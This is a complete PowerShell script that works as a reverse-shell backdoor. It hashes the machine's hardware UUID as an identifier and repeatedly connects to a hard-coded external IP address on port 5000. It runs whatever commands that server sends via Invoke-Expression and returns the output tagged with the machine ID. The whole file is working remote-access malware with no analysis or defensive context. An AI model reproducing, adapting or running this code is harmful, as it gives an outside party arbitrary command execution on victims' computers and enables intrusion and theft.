# Get UUID of the machine.
try {
	$uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
} catch [System.Management.Automation.CommandNotFoundException] {
	$uuid = 0;
}

# Calculate SHA-256 hash from UUID.
$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256');
$uuid = $hasher.ComputeHash($uuid);

# Preallocate byte array with zeroes? Max command length 65535 bytes?
[byte[]] $bytes = 0..65535 |% {0};

# Loop indefinitely until "exit" command is issued.
while (1) {

	# Attempt to establish connection to server. Retry in 5 seconds.
	try {
		$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
	} catch { # Catch ConstructorInvokedThrowException..
		Start-Sleep -s 5;
		continue;
	}
	# Initialize byte stream.
	$stream = $client.GetStream();

    # Read bytes from stream and encode to ASCII.
    $i = $stream.Read($bytes, 0, $bytes.Length);
    $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);

    # If no bytes were read, connection was likely closed.
	if ($cmd -eq "") {
        continue;
    } elseif ($cmd -eq "exit") {
        break;
    }

    # Run command, encode stdout as UTF-8.
    $out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));

    # Write output to stream prepended by UUID.
	$length = $uuid.Length + $out.Length;
    $stream.Write($uuid + $out, 0, $length);
    $stream.Flush();

	$client.Close();
}
